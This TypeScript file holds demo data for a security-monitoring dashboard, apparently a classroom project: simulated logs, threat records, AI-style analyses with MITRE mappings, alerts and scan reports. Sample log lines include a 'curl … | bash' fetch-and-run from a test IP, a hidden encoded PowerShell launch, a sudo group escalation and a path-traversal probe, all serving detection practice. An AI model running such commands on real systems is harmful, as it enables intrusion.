import type {
  AIAnalysisResult,
  ScanReport,
  SecurityAlert,
  ThreatRecord,
} from '../types/security';

function hoursAgo(hours: number): string {
  return new Date(Date.now() - hours * 3600 * 1000).toISOString();
}

export interface LogPreset {
  id: string;
  label: string;
  title: string;
  context: string;
  logText: string;
}

export const SAMPLE_LOG_PRESETS: LogPreset[] = [
  {
    id: 'preset-ssh',
    label: 'SSH Brute Force',
    title: 'Repeated SSH Auth Failures from 198.51.100.42',
    context: 'Simulated Linux bastion host auth.log excerpt (RFC 5737 test IP).',
    logText: `2026-11-19T06:12:04Z bastion-01 sshd[4821]: Failed password for invalid user admin from 198.51.100.42 port 54122 ssh2
2026-11-19T06:12:06Z bastion-01 sshd[4821]: Failed password for invalid user admin from 198.51.100.42 port 54124 ssh2
2026-11-19T06:12:09Z bastion-01 sshd[4825]: Failed password for root from 198.51.100.42 port 54130 ssh2
2026-11-19T06:12:12Z bastion-01 sshd[4825]: Failed password for root from 198.51.100.42 port 54135 ssh2
2026-11-19T06:12:15Z bastion-01 sshd[4829]: Failed password for deploy from 198.51.100.42 port 54141 ssh2
2026-11-19T06:12:19Z bastion-01 sshd[4831]: Accepted password for deploy from 198.51.100.42 port 54150 ssh2`,
  },
  {
    id: 'preset-powershell',
    label: 'Encoded PowerShell',
    title: 'Suspicious Encoded PowerShell Execution on WKSTN-LAB-04',
    context: 'Simulated Windows endpoint process creation telemetry.',
    logText: `2026-11-19T04:41:10Z WKSTN-LAB-04 Sysmon EventID=1 ParentImage="WINWORD.EXE" Image="powershell.exe" CommandLine="powershell.exe -NoP -W Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==" User="CORP\\m.chen"
2026-11-19T04:41:14Z WKSTN-LAB-04 Sysmon EventID=3 Image="powershell.exe" DestinationIp="203.0.113.88" DestinationPort=443 Protocol="tcp"
2026-11-19T04:41:19Z WKSTN-LAB-04 Security EventID=4672 SubjectUserName="m.chen" PrivilegeList="SeDebugPrivilege"`,
  },
  {
    id: 'preset-phishing',
    label: 'Phishing Gateway',
    title: 'Spoofed Payroll Login Lure Bypass Attempt',
    context: 'Simulated email gateway & proxy log sample.',
    logText: `2026-11-19T05:05:22Z mail-gw-01 postfix: sender=<hr-notify@payroll-verify.example> recipient=<finance-team@campus.test> spf=fail dkim=fail dmarc=fail subject="Urgent Password Reset & W2 Verification"
2026-11-19T05:08:41Z web-proxy-02 GET https://payroll-verify.example/auth/sso-login?user=e.patel status=200 src=192.0.2.74 user_agent="Mozilla/5.0"
2026-11-19T05:09:03Z idp-audit Impossible travel alert for user e.patel: login from 203.0.113.190 within 4 minutes of campus session.`,
  },
  {
    id: 'preset-privesc',
    label: 'Privilege Escalation',
    title: 'Unexpected Sudoers & Group Escalation',
    context: 'Simulated Unix auditd log snippet.',
    logText: `2026-11-19T03:18:45Z app-srv-03 sudo: svc_ci : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo intern_test
2026-11-19T03:19:02Z app-srv-03 auditd: SYSCALL arch=c000003e syscall=openat path="/etc/sudoers" auid=1004 uid=0 res=success
2026-11-19T03:20:11Z app-srv-03 bash: curl -s http://198.51.100.77/healthcheck.sh | bash`,
  },
];

export function createDemoDataset(): {
  threats: ThreatRecord[];
  analyses: AIAnalysisResult[];
  alerts: SecurityAlert[];
  scanHistory: ScanReport[];
} {
  const threats: ThreatRecord[] = [
    {
      id: 'THR-SIM-001',
      title: 'SSH Brute-Force Sequence Followed by Successful Login',
      description:
        'Simulated telemetry: 28 failed SSH authentication attempts against bastion-01 followed by an accepted login for service user "deploy" from documentation IP 198.51.100.42.',
      category: 'Brute Force',
      severity: 'Critical',
      sourceIndicator: '198.51.100.42',
      status: 'Open',
      detectedAt: hoursAgo(2),
      recommendedAction:
        'Rotate credentials for user "deploy", terminate active SSH sessions, and block 198.51.100.42 at the perimeter.',
      notes: 'Simulated capstone incident. Correlated with SSH preset log.',
      isDemo: true,
    },
    {
      id: 'THR-SIM-002',
      title: 'Encoded PowerShell Spawned by Word Process',
      description:
        'Simulated telemetry: WINWORD.EXE launched powershell.exe with -EncodedCommand and initiated outbound HTTPS traffic to 203.0.113.88.',
      category: 'Malware Indicator',
      severity: 'Critical',
      sourceIndicator: '203.0.113.88',
      status: 'Investigating',
      detectedAt: hoursAgo(4),
      recommendedAction:
        'Isolate WKSTN-LAB-04, capture memory image, and block outbound connection to 203.0.113.88.',
      notes: 'Simulated endpoint detection for classroom presentation.',
      isDemo: true,
    },
    {
      id: 'THR-SIM-003',
      title: 'Payroll Lookalike Phishing Domain Click-Through',
      description:
        'Simulated telemetry: Inbound email failed SPF/DKIM/DMARC checks and directed finance staff to payroll-verify.example.',
      category: 'Phishing',
      severity: 'High',
      sourceIndicator: 'payroll-verify.example',
      status: 'Open',
      detectedAt: hoursAgo(6),
      recommendedAction:
        'Purge matching messages from mail spools, block payroll-verify.example at DNS/proxy, and reset affected user tokens.',
      notes: 'Simulated phishing lure campaign.',
      isDemo: true,
    },
    {
      id: 'THR-SIM-004',
      title: 'Unexpected Sudo Group Membership Addition',
      description:
        'Simulated telemetry: CI service account added "intern_test" to the sudo group on app-srv-03 outside any scheduled change window.',
      category: 'Privilege Escalation',
      severity: 'High',
      sourceIndicator: 'app-srv-03 / svc_ci',
      status: 'Investigating',
      detectedAt: hoursAgo(9),
      recommendedAction:
        'Remove unauthorized sudo group membership and rotate svc_ci SSH keys immediately.',
      notes: 'Simulated privilege escalation scenario.',
      isDemo: true,
    },
    {
      id: 'THR-SIM-005',
      title: 'Impossible Travel Authentication on SSO Portal',
      description:
        'Simulated telemetry: User e.patel authenticated from 203.0.113.190 four minutes after an active on-campus session.',
      category: 'Credential Abuse',
      severity: 'High',
      sourceIndicator: '203.0.113.190',
      status: 'Open',
      detectedAt: hoursAgo(13),
      recommendedAction:
        'Revoke SSO refresh tokens for e.patel and require hardware MFA re-enrollment.',
      notes: 'Simulated identity anomaly.',
      isDemo: true,
    },
    {
      id: 'THR-SIM-006',
      title: 'Suspicious Archive Binary Hash Observed in /tmp',
      description:
        'Simulated telemetry: File hash matching synthetic test sample e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 staged in temporary directory.',
      category: 'Malware Indicator',
      severity: 'High',
      sourceIndicator: 'e3b0c44298fc1c149afbf4c8996fb924',
      status: 'Resolved',
      detectedAt: hoursAgo(20),
      recommendedAction:
        'Quarantine staged file, verify integrity of cron jobs, and run host baseline diff.',
      notes: 'Simulated file hash indicator; resolved during triage drill.',
      isDemo: true,
    },
    {
      id: 'THR-SIM-007',
      title: 'Off-Hours Database Bulk Export Job',
      description:
        'Simulated telemetry: Automated pg_dump execution exported 1.4 GB from staging replica at 02:35 UTC to 192.0.2.91.',
      category: 'Data Exfiltration',
      severity: 'Medium',
      sourceIndicator: '192.0.2.91',
      status: 'Investigating',
      detectedAt: hoursAgo(28),
      recommendedAction:
        'Confirm with data engineering team whether nightly anonymization export was rescheduled.',
      notes: 'Simulated egress anomaly.',
      isDemo: true,
    },
    {
      id: 'THR-SIM-008',
      title: 'Directory Traversal Probes Against Web Gateway',
      description:
        'Simulated telemetry: Web application firewall logged repeated ../../etc/passwd probe paths from 192.0.2.55.',
      category: 'Anomalous Access',
      severity: 'Medium',
      sourceIndicator: '192.0.2.55',
      status: 'Resolved',
      detectedAt: hoursAgo(36),
      recommendedAction:
        'Confirm WAF blocking rule remained active and verify static file server root confinement.',
      notes: 'Blocked automatically by simulated WAF rule.',
      isDemo: true,
    },
    {
      id: 'THR-SIM-009',
      title: 'Legacy TLS 1.0 Handshake Attempt on API Endpoint',
      description:
        'Simulated telemetry: Deprecated TLS 1.0 client handshake attempts observed from internal QA test runner 192.0.2.18.',
      category: 'Configuration Risk',
      severity: 'Low',
      sourceIndicator: '192.0.2.18',
      status: 'Resolved',
      detectedAt: hoursAgo(48),
      recommendedAction:
        'Update QA test client configuration to enforce TLS 1.2+.',
      notes: 'Simulated configuration hygiene item.',
      isDemo: true,
    },
    {
      id: 'THR-SIM-010',
      title: 'Repeated API Key 401 Failures from CI Runner',
      description:
        'Simulated telemetry: Expired staging token caused 42 consecutive HTTP 401 responses from build-agent-02.',
      category: 'Brute Force',
      severity: 'Low',
      sourceIndicator: '198.51.100.14',
      status: 'Resolved',
      detectedAt: hoursAgo(60),
      recommendedAction:
        'Rotate CI runner secret in vault and verify deployment pipeline.',
      notes: 'Benign misconfiguration confirmed in drill.',
      isDemo: true,
    },
    {
      id: 'THR-SIM-011',
      title: 'Unusual Read Access to HR Shared Archive',
      description:
        'Simulated telemetry: Contractor account accessed 310 archival PDF records within 90 seconds from 192.0.2.120.',
      category: 'Anomalous Access',
      severity: 'Medium',
      sourceIndicator: '192.0.2.120',
      status: 'Open',
      detectedAt: hoursAgo(72),
      recommendedAction:
        'Review contractor access scope and throttle bulk document downloads.',
      notes: 'Simulated insider/contractor access pattern.',
      isDemo: true,
    },
    {
      id: 'THR-SIM-012',
      title: 'Suspicious External DNS Lookup to Unverified Test Domain',
      description:
        'Simulated telemetry: DNS resolver logged repeated TXT queries to update-cdn-check.test from lab subnet.',
      category: 'Phishing',
      severity: 'Medium',
      sourceIndicator: 'update-cdn-check.test',
      status: 'Open',
      detectedAt: hoursAgo(86),
      recommendedAction:
        'Inspect originating workstation DNS cache and sinkhole update-cdn-check.test.',
      notes: 'Simulated DNS telemetry indicator.',
      isDemo: true,
    },
  ];

  const analyses: AIAnalysisResult[] = [
    {
      id: 'ANL-SIM-001',
      incidentTitle: 'SSH Brute-Force Escalating to Valid Login (Simulated)',
      rawLog: SAMPLE_LOG_PRESETS[0].logText,
      context: SAMPLE_LOG_PRESETS[0].context,
      classification: 'Credential Brute Force Followed by Successful Authentication',
      threatCategory: 'Brute Force',
      severity: 'Critical',
      confidence: 88,
      confidenceExplanation:
        'Five rapid failed attempts from 198.51.100.42 immediately preceded an accepted login from the exact same source IP.',
      indicatorsFound: ['IP: 198.51.100.42', 'Account: deploy', 'Host: bastion-01'],
      evidence: [
        '5 consecutive failed SSH password attempts across admin, root, and deploy within 11 seconds.',
        'Accepted password login for user "deploy" at 06:12:19Z from 198.51.100.42.',
      ],
      technicalExplanation:
        'Rapid password spraying/guessing targeting privileged accounts succeeded against the "deploy" service account, indicating weak credentials or missing key-only enforcement.',
      recommendedActions: [
        'Immediately revoke active sessions for "deploy" and rotate credentials.',
        'Block 198.51.100.42 and enforce SSH key-based authentication + MFA.',
        'Audit bash history and authorized_keys on bastion-01.',
      ],
      falsePositivesAndUncertainty:
        'Could represent an authorized penetration test if 198.51.100.42 belongs to an approved assessment team; verify against red-team schedule.',
      mitreMappings: [
        {
          tactic: 'Credential Access',
          techniqueId: 'T1110',
          techniqueName: 'Brute Force',
          rationale: 'Sequential failed SSH logins against multiple accounts prior to access.',
        },
        {
          tactic: 'Initial Access',
          techniqueId: 'T1078',
          techniqueName: 'Valid Accounts',
          rationale: 'Successful authentication obtained using the "deploy" account.',
        },
      ],
      analysisMode: 'rules-based-demo',
      convertedThreatId: 'THR-SIM-001',
      isDemo: true,
      analyzedAt: hoursAgo(2),
    },
    {
      id: 'ANL-SIM-002',
      incidentTitle: 'Office Macro Spawning Encoded PowerShell (Simulated)',
      rawLog: SAMPLE_LOG_PRESETS[1].logText,
      context: SAMPLE_LOG_PRESETS[1].context,
      classification: 'Suspicious Office-to-PowerShell Execution Chain',
      threatCategory: 'Malware Indicator',
      severity: 'Critical',
      confidence: 91,
      confidenceExplanation:
        'WINWORD.EXE spawning hidden encoded PowerShell followed by outbound TCP/443 and SeDebugPrivilege assignment strongly indicates staged execution.',
      indicatorsFound: ['Process: powershell.exe -EncodedCommand', 'IP: 203.0.113.88:443', 'User: m.chen'],
      evidence: [
        'Sysmon EventID=1 shows ParentImage WINWORD.EXE launching powershell.exe -EncodedCommand.',
        'Sysmon EventID=3 shows outbound connection to 203.0.113.88:443 within 4 seconds.',
        'Security EventID=4672 logged SeDebugPrivilege elevation.',
      ],
      technicalExplanation:
        'Document-based execution chained into an obfuscated PowerShell downloader/beacon with subsequent privilege elevation.',
      recommendedActions: [
        'Contain WKSTN-LAB-04 via EDR network isolation.',
        'Decode the Base64 command payload in an isolated sandbox.',
        'Reset credentials for CORP\\m.chen.',
      ],
      falsePositivesAndUncertainty:
        'Some legacy IT automation scripts use encoded PowerShell, though rarely spawned directly by WINWORD.EXE.',
      mitreMappings: [
        {
          tactic: 'Execution',
          techniqueId: 'T1059',
          techniqueName: 'Command and Scripting Interpreter',
          rationale: 'PowerShell executed with -EncodedCommand from an Office parent process.',
        },
        {
          tactic: 'Credential Access',
          techniqueId: 'T1003',
          techniqueName: 'OS Credential Dumping',
          rationale: 'SeDebugPrivilege observed shortly after payload network callback.',
        },
      ],
      analysisMode: 'rules-based-demo',
      convertedThreatId: 'THR-SIM-002',
      isDemo: true,
      analyzedAt: hoursAgo(4),
    },
  ];

  const alerts: SecurityAlert[] = threats
    .filter((t) => t.severity === 'Critical' || t.severity === 'High')
    .map((t, index) => ({
      id: `ALT-SIM-00${index + 1}`,
      threatId: t.id,
      title: `${t.severity} Threat Detected: ${t.title}`,
      message: `${t.category} indicator (${t.sourceIndicator}) — ${t.recommendedAction}`,
      severity: t.severity,
      isRead: index >= 3,
      isDemo: true,
      createdAt: t.detectedAt,
    }));

  const scanHistory: ScanReport[] = [
    {
      id: 'SCN-SIM-001',
      sourceName: 'bastion_auth_sample.log',
      sourceType: 'uploaded-file',
      fileSizeBytes: 842,
      linesScanned: 6,
      overallSeverity: 'High',
      findings: [
        {
          id: 'FND-SIM-1',
          ruleName: 'Repeated Failed Authentication (5 hits)',
          category: 'Brute Force',
          severity: 'High',
          lineNumber: 1,
          matchedText: 'L1: Failed password for invalid user admin from 198.51.100.42 | L3: Failed password for root',
          explanation: 'Multiple failed login attempts detected across log lines.',
          recommendation: 'Enable rate-limiting and inspect targeted usernames.',
          mitreId: 'T1110',
        },
      ],
      summary: 'Scanned 6 lines in "bastion_auth_sample.log" and flagged 1 suspicious pattern match (highest severity: High).',
      isDemo: true,
      scannedAt: hoursAgo(3),
    },
    {
      id: 'SCN-SIM-002',
      sourceName: 'gateway_phishing_excerpt.log',
      sourceType: 'pasted-log',
      fileSizeBytes: 512,
      linesScanned: 3,
      overallSeverity: 'High',
      findings: [
        {
          id: 'FND-SIM-2',
          ruleName: 'Phishing & Spoofing Indicators',
          category: 'Phishing',
          severity: 'High',
          lineNumber: 1,
          matchedText: 'sender=<hr-notify@payroll-verify.example> spf=fail dkim=fail dmarc=fail',
          explanation: 'Email authentication failures combined with credential-lure keywords.',
          recommendation: 'Quarantine related emails and block sender domain.',
          mitreId: 'T1566',
        },
        {
          id: 'FND-SIM-3',
          ruleName: 'Suspicious Off-Hours or Impossible Travel Auth',
          category: 'Anomalous Access',
          severity: 'Medium',
          lineNumber: 3,
          matchedText: 'Impossible travel alert for user e.patel: login from 203.0.113.190',
          explanation: 'Authentication telemetry indicates impossible travel.',
          recommendation: 'Verify login legitimacy with the account owner.',
          mitreId: 'T1078',
        },
      ],
      summary: 'Scanned 3 lines in "gateway_phishing_excerpt.log" and flagged 2 suspicious pattern matches (highest severity: High).',
      isDemo: true,
      scannedAt: hoursAgo(6),
    },
  ];

  return { threats, analyses, alerts, scanHistory };
}
